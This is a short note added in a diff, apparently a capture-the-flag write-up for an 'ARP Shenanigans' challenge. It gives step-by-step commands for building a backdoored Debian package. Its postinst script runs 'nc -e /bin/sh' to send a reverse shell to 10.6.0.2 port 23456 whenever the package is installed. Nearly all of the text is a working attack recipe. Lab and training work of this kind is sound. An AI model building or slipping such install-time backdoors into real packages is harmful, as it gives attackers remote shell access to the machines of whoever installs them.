@@ -1,0 +1,40 @@
+For the ARP Shenanigans challenge I can make a DEB backdoor from scratch.
+References:
+  https://www.youtube.com/watch?v=ep88vVfzDAo
+  https://www.makeuseof.com/how-deb-packages-are-backdoored-how-to-detect-it/
+  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+
+(Start with the directories and empty bin file.)
+~$ mkdir -p ./backdoor/DEBIAN
+~$ mkdir ./backdoor/bin
+~$ touch ./backdoor/bin/backdoor
+
+
+(Make the control file.)
+~$ nano ./backdoor/DEBIAN/control
+Package: backdoor
+Version: 1.0
+Architecture: all
+Essential: no
+Priority: optional
+Maintainer: Vin0xA2
+Description: Backdoor in the postinst script.
+
+
+(Create a postinst script to reverse shell shovel.)
+~$ nano ./backdoor/DEBIAN/postinst
+#!/bin/sh
+nc -e /bin/sh 10.6.0.2 23456
+
+
+(Give the files the right permissions.)
+~$ chmod 755 ./backdoor/DEBIAN/postinst
+~$ chmod 755 ./backdoor/bin/backdoor
+
+
+(Build the package.)
+~$ dpkg-deb --build backdoor
+
+
+(When the DEB file gets installed, the postinst script will shovel a shell to IP 10.6.0.2 port 23456.)
